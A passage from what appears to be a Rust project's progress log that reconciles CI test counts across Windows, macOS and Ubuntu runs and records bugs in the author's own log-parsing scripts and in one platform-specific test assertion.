was written in the same change — so the refactor that removed that code is a
change at least one test can see, and the sentence beside a step is held by
something rather than by prose.

### Reading run `34969139607`, `P4-T002`'s — and a name table that printed `+0` on every row because its pattern matched nothing

**All five jobs green**: `bootstrap-validate-windows`, `rust (windows-latest)`,
`rust (macos-latest)`, `rust (ubuntu-latest)`, `shellcheck-secondary`.

| platform | result lines | passed | failed | ignored |
| --- | --- | --- | --- | --- |
| Windows | 50 | **1334** | 0 | 11 |
| macOS | 50 | **1335** | 0 | 11 |
| Ubuntu | 50 | **1336** | 0 | 11 |

**The baseline is `34964462368`**, the `P4-T001` acceptance carrying `53599d2`,
and the delta is **`+28` on every platform** — 1306 / 1307 / 1308 → 1334 / 1335 /
1336 — with the result-line count going **49 → 50 on all three**, the extra line
being the new `node_checks` binary. **The one- and two-test gaps between the
platforms are the same gaps the previous run had**, so they are pre-existing
rather than anything this task did, and `crates/sure-core/src/paths/compare.rs`
carries the same shape of platform-gated tests (`#[cfg(windows)]`, `#[cfg(unix)]`,
and a `#[cfg(target_os = "macos")]` pair that splits one Unix test into two). The
per-platform figures are read from the sum over every `test result:` line, which
is independent of which target a line belongs to and reproduces on all three
platforms; **no per-test attribution is claimed for macOS or Ubuntu**, for the
reason the method note below already records.

**Local Windows agrees with CI Windows to the test.** The local
`cargo test --workspace --no-fail-fast` on the same commit reports 50 result
lines, **1334 passed, 0 failed, 11 ignored** — the same three numbers CI Windows
reports, which is the check that makes the Windows column of the table above
evidence rather than a log reading.

**The Windows per-name table, against the same baseline:**

| name | before | after | delta |
| --- | --- | --- | --- |
| `sure_core` (lib) | 636 | 654 | **+18** |
| `node_checks` | 0 | 9 | **+9** |
| `check_schedule` | 9 | 10 | **+1** |
| the other 36 names | — | — | **+0** |
| **TOTAL** | **1306** | **1334** | **+28** |

**18 + 9 + 1 = 28, and the decomposition agrees with the local one arrived at from
the other side.** Locally the same `+28` was read off the source as eighteen
`checks::*` unit tests, nine `node_checks` integration tests and one new
`check_schedule` test; the CI name table gets there by counting binaries. **Two
derivations that do not share a step agree on all three parts**, which is what
makes the `−0` on the other thirty-six names worth something: a rename or a
deletion that kept the total would be invisible in `+28` and is visible here.

**The first version of that table printed `+0` on every row and a `+0` total, and
it was wrong.** It was written through a shell heredoc, the shell collapsed the
`\\` in the character class `[\\/]` to a single `\`, and the resulting `[\/]` is a
class containing only `/` — so no Windows target line ever matched, no name was
ever set, and the script printed a well-formed table of zeros. That is the same
defect this file already records twice, once as *"a pattern that matched nothing
prints a well-formed table of zeros that reads exactly like 'no binary changed'"*,
and it was caught only by printing the compiled pattern and looking at it. The
replacement normalises the separator on the line before matching rather than
embedding a backslash in a pattern, and **refuses to print a table at all while
any target line is unmatched**, which is the check the first version lacked.

**The macOS and Ubuntu logs are not paired by name, and this task re-derived that
rule the hard way.** An attempt to build the same table on all three platforms
produced `doctor = 30` on macOS where the other two said 6, `process_runner = 48`
where they said 20 and 28, and `wire_contract = 106` where they said 31 — each of
them the sum of a target and the one before it, because a result line carried its
predecessor's name. **Those are the same class of artefact as the `sure_domain
+87` and `components_graph +22` recorded below**, they were wrong in the way that
matters, and the rule that says so was already in this file — it is the note
*"What is compared by name, what is compared by multiset, and what each can
support"*, which sits inside the next reading down. The Windows-only table above
is what that note sanctions; the macOS and Ubuntu numbers were discarded rather
than published. **A wrong figure that was never written down is cheaper than a
wrong figure with a caveat**, and the correction here is that the existing rule
was not read before the work was done, not that the rule was wrong.

**One figure moved because of that, and the way it moved is the point.** The
broken pairing reported Windows `sure_core` as **649**; the corrected table says
**654**. **The total was 1334 in both tables**, because mis-pairing permutes
values rather than inventing them — so a check that reads only the total could
not have caught it, and the first table's `+0`-on-every-row collapse happened to
be consistent with its own totals for the same reason. What catches it is that
the corrected table reports **zero unmatched target lines** and that its
decomposition **`18 + 9 + 1`** is arrived at from two directions that share no
step — binaries in the log, and `#[test]` functions in the source. **A name table
that sums to the right number is not thereby right**; it is right when its rows
are individually checkable and the pattern behind them is known to have matched,
which is why the replacement refuses to print anything until it has counted them.

### Reading run `34869888350`, `P2-T010`'s — and a delta attributed by binary name

**All five jobs green.**

| job | result lines | parents | children | passed | failed | ignored |
|---|---|---|---|---|---|---|
| `rust (windows-latest)` | 37 | 27 | 10 | **907** | 0 | 1 |
| `rust (macos-latest)` | 37 | 27 | 10 | **909** | 0 | 1 |
| `rust (ubuntu-latest)` | 37 | 27 | 10 | **910** | 0 | 1 |

**907 is the local Windows figure exactly**, measured before the push. The raw
sum over all 37 lines is 917 / 919 / 920, which over-counts by exactly 10 for the
reason recorded above. The platform offsets are +2 and +3, unchanged.

#### The +30, attributed to four named binaries

The multisets alone say *how much* moved; they do not say *what*. The logs carry
the binary name on each `Running` line, so the delta was read out of them by
name on Windows:

| binary | before | after | delta |
|---|---|---|---|
| `sure_core` (lib) | 407 | **416** | **+9** |
| `sure` (bin) | 36 | **48** | **+12** |
| `cli_contract` | 13 | **14** | **+1** |
| `project_intent_ingest` | — | **8** | **+8** (new binary) |

**9 + 12 + 1 + 8 = 30, and every other position is identical.** That is the whole
attribution, and it matches the four places `P2-T010` put tests: nine unit tests
in `sure-core`'s `project_intent`, twelve in `sure-cli`'s `check`/`report`, one in
`cli_contract`, and the eight-test integration binary.

**The four parents the name matcher did not name are the four `Doc-tests`
targets, and reconciling that is what makes the arithmetic close.** 23 `Running`
lines plus 4 `Doc-tests` targets is 27 parents; the 23 named binaries sum to
**903**, and `Doc-tests sure_core` contributes the remaining **4** (the other
three doc-test targets have no tests). 903 + 4 = **907**. `Doc-tests sure_core`
was 4 before this commit too, so it is not part of the delta — but a reader who
subtracts 903 from 907 and finds 4 unexplained should know where it went rather
than assume the table is short.

**Two mistakes were made getting that table, and both are the kind that produce a
green that means nothing.** The first pattern was written `Running .*?deps` — but
the `Running` in a GitHub log is followed by an ANSI colour reset, not a space, so
it matched nothing, and a name matcher that matches nothing prints a
well-formed table of zeros that reads exactly like "no binary changed". The
second carried the last-seen name forward across a `Running` line it had not
matched, which labelled one binary's count with another's name and produced
`sure_domain +87` on Ubuntu and `components_graph +22` on macOS — numbers for
binaries nothing had touched. The fix is in `target/tmp/bincounts.py` (git-ignored)
and the rule is written at the top of it: **consume the name with the result line
it belongs to, and print the number of matches, because a zero-row diff and a
dead pattern are otherwise the same output.**

#### What is compared by name, what is compared by multiset, and what each can support

The per-name table is **Windows only, and deliberately**. The macOS and Ubuntu
logs interleave: cargo's output for parallel test binaries arrives with
timestamps out of order, so a name and the count beneath it are not reliably
adjacent. Every attempt to pair them there produced deltas for binaries nothing
had touched — `sure_domain +87` on Ubuntu, `components_graph +22` on macOS — and
those numbers were wrong in the way that matters, because they looked like
findings.

The multiset is sound on all three platforms, but **it can support less than it
first appears to.** Its claim is checked rather than asserted: substituting the
four Windows deltas into each platform's *before* multiset (404→413, 36→48,
13→14, and one new 8) reproduces each *after* multiset exactly, on both Unix
jobs. What it does **not** do is determine those deltas — sorting discards which
value was which, so on macOS a greedy positional alignment instead yields
`47→48, 46→47, 36→46`, a different mapping that is arithmetically consistent too.
**The multiset is consistent with the attribution; the Windows name table is what
pins it.** Recorded at this length because the tempting sentence — "the multiset
says the same thing on all three platforms" — is the one this file is supposed to
be able to refuse, and it very nearly went in.

### Reading runs `34956776646` and `34957515713`, `P3-T010`'s last two — and a red on a commit that changes one comment

**The pair is the whole reading, so the two runs are set against each other
rather than described one at a time.** `0eb1ac3` changes one doc comment and no
executable line; `01fc2a7` adds a predicate to `probe.rs`. One commit apart, and
the two runs differ in exactly the ways the second commit predicts.

| | `34956776646` (`0eb1ac3`) | `34957515713` (`01fc2a7`) |
| --- | --- | --- |
| `rust (windows-latest)` | **failure** — 1249 passed, **1 failed** | **success** — **1251** passed, 0 failed |
| `rust (macos-latest)` | success — 1251 | success — **1252** |
| `rust (ubuntu-latest)` | success — 1252 | success — **1253** |
| result lines = results | **47** = **37 parents + 10 children** | **47** = **37 parents + 10 children** |
| ignored | 11 | 11 |

**macOS and Ubuntu are identical in both runs, and that is the measurement rather
than a coincidence.** The doc-only commit's figures on those two jobs are the
previous run's (`34955834313`) to the test — 1251 and 1252, 47 result lines, 11
ignored — so on two of three platforms the commit changed nothing at all, which
is what a doc-comment commit must produce. **Windows is the platform that
moved**, from 1250 passed to 1249 passed + 1 failed: the total is unchanged and
one test crossed the line, which is the signature of a test that failed rather
than of a test that was added or removed.

**The failing test is the one whose name says which half of the product it
tests.** `a_port_with_nothing_behind_it_is_refused_rather_than_unreachable`,
with the assertion text `a closed loopback port refuses the connection; the probe
reported NotHttp { first_line: "GET / HTTP/1.1" }`. **The reported first line is
the probe's own request line** — the bytes the probe wrote came back to it — and
because the commit under test changes one comment, the defect was known to be in
the code before the cause was known. That is the reading a red on a
documentation-only commit is worth: **a test cannot be flaky into reporting the
bytes it wrote itself**, so the colour was information rather than noise, and the
run did not need to be re-triggered to find out.

**The green run then closes the pair from the other side.** Windows went **1250
total → 1251**, which is **+1 and nothing else**: the integration test moved out
of the failed column and the one new unit test,
`a_connection_whose_local_address_is_the_one_it_dialled_did_not_reach_a_service`,
was added. macOS and Ubuntu each moved **+1** as well — the same new unit test —
so **the three platforms agree that exactly one test was added**, and the fix
added no binary: the result-line count stays **47 = 37 parents + 10 children** on
every job, and the pairwise lines are the standing two, `windows vs macos: -13
+14` and `windows vs ubuntu: -12 +14`, in both runs.

**`01fc2a7` is also the first commit on this branch whose fix is one commit after
a red found by a black-box test rather than by a compile or a lint**, and the run
that confirms it was read rather than assumed — which matters here more than
usual, because the fix's own branch is the part **no test in `sure-core` covers**
(`m11` below).

### Reading run `34955834313`, `P3-T010`'s implementation — and the first delta in this file whose `−0` was predicted from an arithmetic

Five jobs, all `success`, on `9ad32e6`. Windows **1250** / macOS **1251** / Ubuntu
**1252** parent tests, **0 failed**, 11 ignored, over **47 result lines = 37
parents + 10 children** on every job. The pairwise lines are the standing two,
`windows vs macos: -13 +14` and `windows vs ubuntu: -12 +14`, unchanged from
`664575b` through `P3-T009`'s three runs.

**The result-line count moved from 46 to 47, and this is the first time that
number has moved for a reason other than a new child pair.** A new integration
file is a new `Running … (tests/probe_local_service.rs)` section; the 37 parents
are 36 plus one section header. **A reader who compared `lines` across these two
runs without knowing that would see a number that moved by one and a parent count
that moved by one, and conclude a test file had gained a section — which is right,
and is not the same as a test having been added.**

`name-delta.py` against `34954317400`, `P3-T009`'s tip, is **`+23 −0` on all three
platforms**, and the three added *sets* are identical name for name:

```
+20  tests/probe_local_service.rs          (the new file)
 +2  probe::tests::…                       (the two unit tests, from the lib section)
 +1  status::tests::an_unknown_check_carries_the_evidence_it_was_given_and_no_skip_reason
=23
```

**The `−0` was predicted before the run was read**, which is the first time in
this file that has been true of a delta. The prediction is available from the
commit: it adds a module, a test file and a constructor, and touches no existing
test — so a rename or a removal would have meant something the commit did not
say. `+27 −2` and `+23 −0` both "pass" a suite; only the second is the commit
that was written.

**The three platforms agree on the added set, and that is the load-bearing part
rather than the count.** Two of the twenty integration tests are the kind that
could have been platform-sensitive — `a_port_with_nothing_behind_it_is_refused_rather_than_unreachable`
needs a closed loopback port to produce `ECONNREFUSED` rather than something else,
and two tests assert on **elapsed time** — and all three platforms pass them. The
elapsed-time assertions are the ones worth naming: they are what caught the read
loop spending a whole deadline after the first byte had already settled the
outcome, and a platform where they were merely lucky would be a platform where
that bug could come back unseen.

**And the local run agrees with the Windows job exactly**: `cargo test --workspace`
on this machine reports **1250 passed, 0 failed**, which is the Windows job's
number. That is the third time in this project a local and a CI Windows count have
matched after a task, and it is worth stating because the two are computed by
different code — the local figure by `target/tmp/count_tests.py`, the CI figure by
`target/tmp/read-run.py`, whose parent/child convention this file has already had
to correct twice.

### Reading run `34953593684`, `P3-T009`'s acceptance — and a progress-only commit whose reading had to be the one before it

**Five jobs, all `success`**, and every number is the previous run's number
exactly:

| job | result lines | parents | children | passed | failed | ignored | parent sum |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `rust (windows-latest)` | 46 | 36 | 10 | 1227 | 0 | 11 | **1217** |
| `rust (macos-latest)` | 46 | 36 | 10 | 1228 | 0 | 11 | **1218** |
| `rust (ubuntu-latest)` | 46 | 36 | 10 | 1229 | 0 | 11 | **1219** |

**`name-delta.py` against `34952509429` is `+0 −0` on all three platforms, and
that is the whole of what this run had to show.** `a6bc8df` changes three files —
`progress/state.json`, `progress/DECISIONS.md` and `progress/HANDOFF.md` — and
nothing under `crates/` or `tests/`, so **a census that had moved would have been
the finding**; a census that did not is the claim, measured rather than assumed.
This is the second run in this file whose job was to read identically to the one
before it (`a2d08a6`, `P3-T008`'s acceptance), and the first is the reason the
check is run at all rather than reasoned about.

**The pairwise lines are the standing two**: `windows vs macos: -13 +14` and
`windows vs ubuntu: -12 +14`, unchanged from `664575b`, `6353477`, `18209d8`,
`719253e`, `0f9273b`, `6ea9f46`, `1f403d8` and both of this task's own earlier
runs. **The acceptance commit is pushed and its run read as part of the
acceptance**, which is the order this file states and not an extra step: the
branch's checkpoint is the acceptance commit, and a checkpoint whose run has not
been read is a push, not a checkpoint.

**`af2cd75`'s own run, `34953980527`, was read the same way and reads the same
way**: five jobs `success`, Windows **1217** / macOS **1218** / Ubuntu **1219**,
the same 46 = 36 + 10, and `+0 −0` against `34953593684` on all three platforms.
**Reading it produced the next instrument trap, and the trap is in this file's own
tool.** `read-run.py` takes each log's job name from the *filename*: `label_of`
splits the stem on `-` and keeps everything after the second one, so a log named
`run34953980527-104331457670.log` — the job id, which is what `gh run view --json
jobs` hands out — is labelled with its whole stem. It does not fail. It printed

```
run34953980527-104331457670 vs run34953980527-104331457764: -3 +2
run34953980527-104331457670 vs run34953980527-104331457856: -14 +12
```

which are the differences between **whichever two platforms happened to sort
first**, Ubuntu against macOS and Ubuntu against Windows, under labels that name
neither. **The standing lines are `-13 +14` and `-12 +14`; these are not those,
and that is the only reason the mistake was caught.** The tool already refuses a
*duplicate* label — the docstring records that an empty label once made two logs
displace one another silently — and it cannot refuse a meaningless one, because a
job id is a perfectly good string. Renaming the three logs to `…-windows.log`,
`…-macos.log` and `…-ubuntu.log` reproduced `-13 +14` and `-12 +14` exactly, and
the `+0 −0` name deltas were then recomputed against the correctly paired logs
rather than the ones the shell globbed first. **The lesson is not "name the
files"**, which this file already says: it is that a tool whose labels come from
outside its input will answer a question nobody asked, and the only check that
caught it was holding the answer against the number that was expected.

### Reading runs `34952200942` and `34952509429`, `P3-T009`'s — and a red that was the test's fault rather than the product's

**Two runs, because the first one was red and a red run is not finished until the
fix's run has been read.** `34952200942` is `6911e2a`'s, the implementation;
`34952509429` is `12b81bc`'s, the one-assertion fix. Both read from the logs rather
than from the job colour, and the second is only interpretable next to the first.

| run | commit | windows | macos | ubuntu | jobs |
| --- | --- | --- | --- | --- | --- |
| `34952200942` | `6911e2a` | success | **failure** | success | 5 jobs, 1 red |
| `34952509429` | `12b81bc` | success | success | success | 5 jobs, all green |

**The first run, read platform by platform:**

| job | result lines | parents | children | passed | failed | ignored | parent sum |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `rust (windows-latest)` | 46 | 36 | 10 | 1227 | 0 | 11 | **1217** |
| `rust (macos-latest)` | 46 | 36 | 10 | 1227 | **1** | 11 | **1217** |
| `rust (ubuntu-latest)` | 46 | 36 | 10 | 1229 | 0 | 11 | **1219** |

**One name failed, on one platform, and `read-run.py` names it rather than the
count doing so**: `a_service_that_ends_by_itself_reports_the_code_it_ended_with_and_where_it_ran`.
The macOS log gives the reason, and it is a false red:

```
assertion `left == right` failed: a service runs in the directory its supervisor was given
  left: Some("/private/var/folders/36/…/T/sure-service-ends-by-itself-6514/working")
 right: Some("/var/folders/36/…/T/sure-service-ends-by-itself-6514/working")
```

The child reports `std::env::current_dir()`, which resolves every symlink; the test
built the expected path from `std::env::temp_dir()`, which does not, and `/var` is a
symlink to `/private/var` on macOS. **The service ran in the directory its
supervisor was given — which is the whole of what the assertion claimed — and the
assertion was the thing that was wrong.**

**The second run, read the same way:**

| job | result lines | parents | children | passed | failed | ignored | parent sum |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `rust (windows-latest)` | 46 | 36 | 10 | 1227 | 0 | 11 | **1217** |
| `rust (macos-latest)` | 46 | 36 | 10 | **1228** | 0 | 11 | **1218** |
| `rust (ubuntu-latest)` | 46 | 36 | 10 | 1229 | 0 | 11 | **1219** |

**macOS moves by exactly one and the other two do not move at all**, which is what
an assertion that was wrong predicts: 1217 → 1218 is the failing test becoming a
passing one, and Windows at 1217 and Ubuntu at 1219 are identical across the two
runs. **`name-delta.py` between the two runs is `+0 −0` on all three platforms**,
so no test was added, removed or renamed by the fix — the fix is a change to one
test body and nothing else, and that is measured rather than argued from the diff.

**Windows CI equals this machine's own `cargo test --workspace --no-fail-fast`
exactly, 1217 for 1217**, as it did at `P3-T008`, `P3-T007`, `P3-T006`, `P3-T005`
and `P3-T002`. macOS is +1 and Ubuntu +2, the standing platform-count shape, and it
holds on both runs rather than only on the green one.

**And the two pairwise lines are unchanged on both runs, including the red one.**
`read-run.py` prints `windows vs macos: -13 +14` and `windows vs ubuntu: -12 +14`
at `34952200942` and again at `34952509429` — **the same two lines as at all eight
commits this file recorded them for before these two runs: `664575b`, `6353477`,
`18209d8`, `719253e`, `0f9273b`, `6ea9f46`, `1f403d8` and `a2d08a6`.** Those eight
are named rather than counted for the reason the section above gives — a total is
checked against nothing, and this file has already carried two wrong ones for this
same pair. **A red run whose pairwise
lines are the standing ones is itself a reading worth taking**: a platform
difference that moves is what a `#[cfg]`-gated test entering or leaving the census
looks like, and neither run shows one.

**The lesson the first run taught is about the repository rather than about this
task.** `P3-T001`'s `tests/process_runner.rs` asserts *"the child ran in the
directory we asked for"* about this same runner and canonicalizes both sides, with
a comment naming the Windows reason — **the same directory returned with a
different drive-letter case**. The rule is every platform's and the reason given
was one platform's, and the next file to make the comparison copied the shape and
not the rule. **Both comments now name both cases.** A reader who took the earlier
comment at its word would have written exactly what this task wrote, which is why
the fix is a comment as well as a `canonicalize`.

### Reading run `34949042220`, `P3-T008`'s acceptance — and a run that had to read *exactly* like the one before it

Run `34949042220`, commit `1f403d8372c7d55aee40489db88e104e4af32a13` — the commit
carrying this file. All five jobs `success`, and the three platform logs read
rather than taken from the job colour:

| job | result lines | parents | children | passed | failed | ignored |
| --- | --- | --- | --- | --- | --- | --- |
| `rust (windows-latest)` | 45 | 35 | 10 | **1209** | 0 | 9 |
| `rust (macos-latest)` | 45 | 35 | 10 | **1210** | 0 | 9 |
| `rust (ubuntu-latest)` | 45 | 35 | 10 | **1211** | 0 | 9 |

**The three figures are identical to `34946515895` for the same reason `0f9273b`
and `6ea9f46` gave the same pairwise lines: this commit changes no source file.**
`git diff --stat` over it is `progress/DECISIONS.md`, `progress/HANDOFF.md` and
`progress/state.json` and nothing else, so a difference here would have meant a
gate had failed differently for a reason no commit in it explains. **That is the
one property this reading had to establish and the one the earlier readings could
not**: the four `P3-T008` deltas were taken against a moving target, and this one
is taken against a target that did not move.

`read-run.py` prints `windows vs macos: -13 +14` and `windows vs ubuntu: -12 +14`
— **the same two lines as at every commit this branch's record names before this
one: `664575b`, `6353477`, `18209d8`, `719253e`, `0f9273b` and `6ea9f46`.** Six
readings of the same pair ahead of this one, across two tasks and three commits of
a third, and not one of them moved. Those six are the ones re-measured on this
branch; **earlier readings of the pair exist further down this file and were not
re-taken**, so the claim is about these six and this one rather than about every
run in the record. **The names are written out because both drafts of this
sentence were wrong, in the two ways a list of this kind can be.** The first named
five commits and *"now here"* and then called the total seven — a count one longer
than the list it was counting. The second replaced `719253e` with `1f403d8`, which
is the commit **this section is about**, so the list of readings preceding this one
contained the reading itself. Neither error is visible in the total, because a
total is not checkable against anything in this file; the six are, and re-reading
the sections at lines 3543 and 3633 is what produced this list. **A pairwise line
that never changes is worth reading every time anyway**, because the failure it
would catch — a new `#[cfg]`-gated test, or a platform-conditional one silently
dropping out of the census — is invisible in the parent sum, which is the number
every headline uses.

**The two jobs that are not about Rust are the ones that examine this commit's own
claims.** `bootstrap-validate-windows` reads `progress/state.json` as this commit
wrote it: *"SURE bootstrap validation OK: 17 phases, 166 tasks"*, *"state OK: 166
tasks"*, then the PowerShell validator's *"PowerShell bootstrap validation OK."*
**That is the closest thing this repository has to a check on the acceptance, and
it checks the shape of the file rather than the truth of it** — which is exactly
why the note it accepted was the one a hand corrected afterwards, and why the
148-escape rewrite inside it passed every job on this run. `shellcheck-secondary`
is `success` and has no count to read.

**This reading's own commit was pushed as `a2d08a6` and its run is `34949484506`,
read the same way and with the same result**: all five jobs `success`, Windows
**1209** / macOS **1210** / Ubuntu **1211**, 0 failed, 9 ignored, **45 result lines
= 35 parents + 10 children**, and `windows vs macos: -13 +14` / `windows vs
ubuntu: -12 +14` again — **the pair unchanged here as at the six the sentence
above names and at the commit this section is about**, which is what a commit
touching no source file predicts. **It is
recorded in the commit after it rather than in one of its own**, which is how this
sequence terminates: a commit whose only content is a reading would produce another
run needing another reading, and the numbers would be identical every time for the
reason this section gives — it changes no source file.


### Reading run `34946515895`, `P3-T008`'s — and a delta that closes from four directions at once, one of which is a tool caveat

Run `34946515895`, commit `6ea9f461288eaa6d6bc70947650b5a727c1fd155`. All five jobs
`success`, and the three platform logs read rather than taken from the job colour:

| job | result lines | parents | children | passed | failed | ignored |
| --- | --- | --- | --- | --- | --- | --- |
| `rust (windows-latest)` | 45 | 35 | 10 | **1209** | 0 | 9 |
| `rust (macos-latest)` | 45 | 35 | 10 | **1210** | 0 | 9 |
| `rust (ubuntu-latest)` | 45 | 35 | 10 | **1211** | 0 | 9 |

**Windows CI equals this machine's own `cargo test --workspace --no-fail-fast`
exactly, 1209 for 1209** — 45 result lines, 1219 raw passed, 0 failed, 9 ignored,
and 1209 = 1219 − the 10 `store_concurrency` children. macOS is +1 and Ubuntu +2,
the standing shape. The parent count moves 34 → 35 and the result-line count 44 →
45 for the same reason: one new integration test file,
`container_isolation_claim.rs`, is one new test binary.

**The delta is read four ways, because each of the four can fail on its own.** A
count can be right while the names behind it moved, and a name diff cannot tell an
addition from a rename — so the fourth is the one that settles it.

| reading | before → after | delta |
| --- | --- | --- |
| parent sum, Windows CI | 1188 → 1209 | **+21** |
| source `#[test]` functions | 1184 → 1205 | **+21** |
| by-name, all three platforms | — | **+21 −0** |
| result lines (parents) | 44 (34) → 45 (35) | +1 (+1) |

**And `−0` on all three platforms is what makes it an addition.** The 21 names are
the sixteen `container::tests::*` and the five bare integration names:
`a_machine_with_no_container_runtime_is_a_value_and_not_a_failure`,
`no_description_of_container_mode_calls_it_isolated_without_denying_that_it_is`,
`the_consent_prompt_for_container_mode_says_limited_isolation`,
`the_modules_own_claim_is_the_same_claim_the_documents_make`,
`the_rule_tells_a_claim_from_a_denial_and_the_list_is_not_empty`. Not one name was
removed anywhere, which a rename would have required.

**The platform difference did not move, and that is a fact about these tests rather
than luck.** `read-run.py` prints `windows vs macos: -13 +14` and `windows vs
ubuntu: -12 +14` at `0f9273b` and at `6ea9f46` alike — the same two lines as at
`664575b`, `6353477` and `18209d8`. Twenty-one new tests and **not one entered a
platform difference**, which is what a module of pure data construction and a scan
over both `crates/` and `docs/` predicts: none of the 21 names is `#[cfg]`-gated.
The one place a platform does appear — `EXECUTABLE_SUFFIX` in the module's test
helpers — is a `cfg!`-free `#[cfg]` pair inside a test module, and the name it
belongs to is present on all three platforms, which is how a reader can tell it
compiled rather than vanished.

**The fourth reading nearly reported the wrong thing, and the harness said so.**
The source-level count was first taken with `git grep -h '#\[test\]' -- crates`,
which reported **1184** — the same number as at `0f9273b`, for a worktree holding
**1205**. `git grep` with no revision reads the index and worktree but **skips
untracked files**, and both new files were untracked at that moment. The reading is
a `grep -rh` over the tree instead, and the four earlier source-count readings in
this file were taken on committed trees, where `git grep` is correct and where
every one of them is reproduced by this run's numbers.

**The two jobs that are not about Rust are the ones that examine this commit's
own claims.** `bootstrap-validate-windows` runs `node scripts/validate-bootstrap.mjs`
— *"SURE bootstrap validation OK: 17 phases, 166 tasks"* — then
`node scripts/taskctl.mjs validate` — *"state OK: 166 tasks"* — then the PowerShell
validator, so the job reads `progress/state.json` as this commit wrote it and the
acceptance claim about that file is what it checks. `shellcheck-secondary` is
`success` and has no count to read.

### Reading runs `34943445326`, `34943853809` and `34944133634`, `P3-T007`'s three — and a delta read three times for `+14`, `+1` and `+1`

Three commits, three runs, three readings, and the reason there are three is in
"What `P3-T007` added" above: the second and third were each found after the one
before it had been pushed and read. All five jobs `success` on all three runs, by
conclusion and by log:

| run | commit | `rust (windows-latest)` | `rust (macos-latest)` | `rust (ubuntu-latest)` | other two jobs |
|---|---|---|---|---|---|
| `34943445326` | `6353477` | `104297213459` | `104297213441` | `104297213342` | `success`, `success` |
| `34943853809` | `18209d8` | `104298544813` | `104298544425` | `104298544147` | `success`, `success` |
| `34944133634` | `719253e` | `104299417985` | `104299418038` | `104299417901` | `success`, `success` |

`shellcheck-secondary` and `bootstrap-validate-windows` are the other two, and
neither is named here as anything but `success` because neither carries a test
count. **The three logs of each run were downloaded and read during this
acceptance**, so the table below is measured from the logs rather than transcribed
from the implementation session's notes. `target/tmp/read-run.py` over the three
sets of three:

| run | job | result lines | parents | children | passed | failed | ignored | **parents only** |
|---|---|---|---|---|---|---|---|---|
| `34943445326` | windows | 44 | 34 | 10 | 1196 | 0 | 9 | **1186** |
| `34943445326` | macos | 44 | 34 | 10 | 1197 | 0 | 9 | **1187** |
| `34943445326` | ubuntu | 44 | 34 | 10 | 1198 | 0 | 9 | **1188** |
| `34943853809` | windows | 44 | 34 | 10 | 1197 | 0 | 9 | **1187** |
| `34943853809` | macos | 44 | 34 | 10 | 1198 | 0 | 9 | **1188** |
| `34943853809` | ubuntu | 44 | 34 | 10 | 1199 | 0 | 9 | **1189** |
| `34944133634` | windows | 44 | 34 | 10 | 1198 | 0 | 9 | **1188** |
| `34944133634` | macos | 44 | 34 | 10 | 1199 | 0 | 9 | **1189** |
| `34944133634` | ubuntu | 44 | 34 | 10 | 1200 | 0 | 9 | **1190** |

**Windows CI equals this machine's own `cargo test --workspace --no-fail-fast`
exactly at the final commit, 1188 for 1188, over the same 44 result lines = 34
parents + 10 children** — as it did at `P3-T006`, `P3-T005` and `P3-T002`. macOS
is +1 and Ubuntu +2, the standing platform-count shape, and it holds at all three
commits rather than only at the last. No `FAILED` name appears in any of the nine
logs, and the three-by-three grid is what makes that a statement about each commit
rather than about the newest one.

**THE DELTA IS READ THREE TIMES, ONCE PER COMMIT, WHICH IS THE POINT OF THE THREE
COMMITS RATHER THAN AN ARTIFACT OF THEM.** Taking each platform's set of test
names from the run before and again from the run after, per name rather than per
count — `target/tmp/name-delta.py`, and its name set sizes at the four commits are
1165/1166/1167 → 1179/1180/1181 → 1180/1181/1182 → 1181/1182/1183:

| pair | windows | macos | ubuntu | the additions |
|---|---|---|---|---|
| `664575b` → `6353477` | **+14 −0** | **+14 −0** | **+14 −0** | the 14 `enforce::tests::*` names of the module |
| `6353477` → `18209d8` | **+1 −0** | **+1 −0** | **+1 −0** | `a_batch_file_is_never_admitted_in_any_mode_under_any_permission_set` |
| `18209d8` → `719253e` | **+1 −0** | **+1 −0** | **+1 −0** | `a_check_is_dynamic_exactly_when_one_of_its_commands_runs_project_code` |

**Fourteen, one and one, and not one name removed in any of the nine pairs.** The
sixteen names the three deltas add are the sixteen `#[test]` functions in
`enforce.rs`, and that is the third direction this change closes from: parent sum
`1172 → 1186 → 1187 → 1188` is **+14, +1, +1**; source-level `#[test]` functions
are **+14, +1, +1**; and the namesets move by the same three numbers on all three
platforms at once. **A name diff still cannot tell an addition from a rename**, so
what makes this a closing rather than a coincidence is `−0` in all nine pairs: a
rename would have removed a name, and none was removed anywhere.

**And the per-platform differences are unchanged at all four commits, which is
checked rather than assumed.** `read-run.py` prints two pairwise comparisons, and
at every one of the four commits they read `windows vs macos: -13 +14` and
`windows vs ubuntu: -12 +14` — thirteen names on Windows that macOS does not have
and fourteen the other way, twelve and fourteen against Ubuntu. **Those two lines
are the same at all four commits**, through a change that added sixteen tests,
which is what the module being pure arithmetic over plans predicts: not one of the
sixteen
names is `#[cfg]`-gated, so every one of them is present on all three platforms
and none of them can enter the difference. A change that moved these numbers would
have meant a test that runs on one operating system and not another, and there is
none in `enforce.rs`.

**The one thing about these three runs that is a reading rather than a
measurement: the third run's log is the only one whose delta could have been
something other than `+1`.** The green suite at `18209d8` did not contain the test
the third commit adds — that is *why* the third commit exists, and the mutation run
that found the hole is recorded above. So `+1` at `719253e` is the statement that
the hole is now held by a test in all three compiled trees, and it is the same
claim the commit message makes; **the two agree because both were written from
this log, not because one was copied into the other.**

**And the acceptance commit's own run is the fourth, read after the fact because
this file's rule is that a push is not finished until its run has been read.** Run
`34945070507`, commit `0f9273b946de4639eab8104e4b4bc5f0ce3d86e6`. All five jobs
`success`, and the three platform logs read: **Windows 1188 / macOS 1189 / Ubuntu
1190** parents, 0 failed, 9 ignored, over the same 44 result lines = 34 parents +
10 children — every number the same as `719253e`'s.

| pair | windows | macos | ubuntu |
|---|---|---|---|
| `719253e` → `0f9273b` | **+0 −0** | **+0 −0** | **+0 −0** |

**`+0 −0` on all three platforms is the statement that this commit added no test
in any compiled tree, and it is measured rather than argued from the diff.** That
is what an acceptance commit should produce, and it is the only kind of commit on
this branch where the delta is expected to be nothing: it touched
`progress/DECISIONS.md`, `progress/HANDOFF.md` and `progress/state.json` and
nothing else. **A `+1` here would have meant a test came in with the acceptance
note**, which is exactly the failure this census exists to notice.

**The two jobs that are not about Rust are the ones that actually examine this
commit, and both were read rather than taken from the job colour.**
`bootstrap-validate-windows` runs `node scripts/validate-bootstrap.mjs` — *"SURE
